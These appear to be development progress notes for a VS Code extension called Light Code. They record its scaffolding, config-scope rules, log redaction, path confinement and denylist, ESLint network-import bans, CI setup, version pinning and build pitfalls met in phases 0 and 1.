  `apps/vscode/src/platform/` (`NodeFileSystem`, `NodeTerminal`, `VSCodeSecretStore`,
  `VSCodeConfigStore`, `WebviewTransport`). None have callers yet — that's expected
  until later phases build the tools/UI/auth that consume them.
- `packages/core/src/config/`: a zod schema modelling exactly the four user-scope-only
  fields named in invariant 5 (nothing else yet — no other config shape has been
  designed), `mergeScopes()` enforcing that list (workspace values for those keys are
  dropped and reported in `ignoredWorkspaceKeys`, never silently applied or silently
  dropped), and a `ConfigManager` tying schema + scopes + `ConfigStore` together for
  load/validate/save/watch.
- `packages/core/src/logging/`: `redact()` (known-secret values, `Bearer` tokens,
  `sk-`-style keys) and a `Logger` that always routes through it.
- `packages/core/src/fs/`: `confine()` (realpath + case-insensitive containment per
  §16, handles not-yet-existing paths for writes) and `PathDenylist` (invariant 6,
  compares resolved paths so a symlink can't launder a denied file under another name).
- 18 unit tests (`confine`, `denylist`, `scopes`, `redact`), all passing. The symlink
  test is `skipIf`-guarded and currently **skips on this dev machine** (no Developer
  Mode / symlink privilege) — it will actually run wherever that privilege exists,
  which should include CI's `windows-latest` job; worth confirming once CI runs for
  real rather than assuming.
- `SecretStore` round-trip through real `vscode.SecretStorage` and `ConfigStore`
  hot-reload against a real `globalStorageUri` were **not** independently verified —
  both need a real extension host and currently have no caller in `extension.ts`
  (Phase 1's own scope fence: "Not in this phase: Any UI. Any provider."). Verify
  these for real the first time something in Phase 2+ actually wires them in.

**Phase 0 done:**
- pnpm workspace scaffolded (`packages/core`, `packages/ui`, `apps/vscode`), all four
  commands (`build`, `test`, `lint`, `typecheck`) pass.
- ESLint flat config enforces both invariants: `packages/core` cannot import `vscode`,
  and `fetch`/`axios`/`undici`/`node-fetch`/`node:http(s)` are banned everywhere except
  the (not-yet-created) `packages/core/src/platform/http.ts`. Both verified by
  deliberately violating them and confirming ESLint fails.
- `apps/vscode` registers one command (`lightCode.openPanel`) that opens an empty
  webview with a strict CSP. Verified via F5 in a real Extension Development Host.
- Publisher ID is `ChosenGeneration`; repo is
  `https://github.com/chosengenerationdev/light-code`.
- CI workflow (`.github/workflows/ci.yml`) runs lint/typecheck/build/test on
  `ubuntu-latest` and `windows-latest` via `pnpm install --ignore-scripts`. Not yet
  exercised on an actual push/PR.

**Surprised us — worth knowing before Phase 1:**
- `typescript-eslint` does not yet support TypeScript 7 (the new native/Go compiler that
  `pnpm add typescript` resolves to as `latest`). Pinned `typescript` to `6.0.3`, the
  newest release `typescript-eslint@8.x` supports. Re-check this pin before bumping
  TypeScript later.
- `apps/vscode/package.json` must **not** have `"type": "module"`. esbuild bundles
  `extension.ts` to CommonJS (VS Code's extension host `require()`s the entry point), but
  a `"type": "module"` package makes Node treat that CJS output as ESM, and the
  extension fails to load with a misleading symptom: the command shows as
  "not found" rather than an activation error. The build script itself needs ESM
  (top-level `await`), so it's named `esbuild.mjs` — an explicit extension that opts
  into ESM regardless of the package's own module type.
- pnpm now blocks postinstall scripts by default (`ignoredBuiltDependencies`); had to
  approve `esbuild`, `@vscode/vsce-sign` in `pnpm-workspace.yaml`'s `allowBuilds` (left
  `keytar` unapproved — only needed for `vsce login`, not `vsce package`).
- `engines.vscode` and `@types/vscode` were deliberately set to `1.102.0` (released
  2025-07-10, ~13 months before project start) rather than the newest release, and
  `@types/vscode` is pinned exactly (no `^`) so that using an API newer than the
  `engines` floor is a typecheck error, not a runtime surprise on an older VS Code.
  Bump both together, deliberately, if the minimum supported version ever changes.
  **Lowered to `1.84.0` in 0.1.1** after a real install failed on a VS Code 1.98 machine.
  The floor was always a policy ("about a year old"), never an API requirement — the
  newest API the extension touches is `SecretStorage` (1.53) — so it was excluding users
  for nothing. 1.84 matches Roo Code's final release (v3.54.0), which is the comparison
  the user asked for. The pinning discipline is what made this a safe two-line change:
  lowering `@types/vscode` to match and getting a clean typecheck *is* the proof that no
  newer API is in use. Do not raise the floor again without a specific API that needs it.

**Surprised us in Phase 1:**
- TypeScript wasn't auto-discovering `@types/node` under this pnpm layout — `process`,
  `fetch`, `node:path`, etc. all failed with "Cannot find name". Root cause not fully
  chased down (plausibly a pnpm-isolated-`node_modules` interaction with TS's
  typeRoots walk); fixed by adding `"types": ["node"]` explicitly in
  `tsconfig.base.json` rather than relying on auto-discovery. If a package ever needs
  to *not* have Node globals ambiently available, it'll need to override this.
- `apps/vscode` importing `@light-code/core` broke `tsc --noEmit` because core's
  `package.json` points `types` at `dist/index.d.ts`, which doesn't exist until core
  is built — and running `pnpm typecheck` alone (as opposed to `pnpm build`) never
  builds it. A `paths` mapping to core's `src/index.ts` doesn't work either: it
  collides with `rootDir`. Fixed properly with TS project references
  (`apps/vscode/tsconfig.json` → `references: [{ path: "../../packages/core" }]`,
  `typecheck` script → `tsc -b tsconfig.json`), which is also the standard fix for
  Phase 2+ as more packages start depending on core.
- The `execute_command` tool's real implementation (Phase 3) still needs a decision:
  keep `Terminal`'s current `node:child_process` implementation, or switch to VS
  Code's terminal shell-integration API for a visible terminal and shell-reported
  exit codes. Flagged here rather than decided silently.

**Open questions for the user:**
- None blocking. Apigee specifics (token path, client credentials, header name, expiry)
  are configurable with defaults rather than fixed, so no answer is required to proceed.
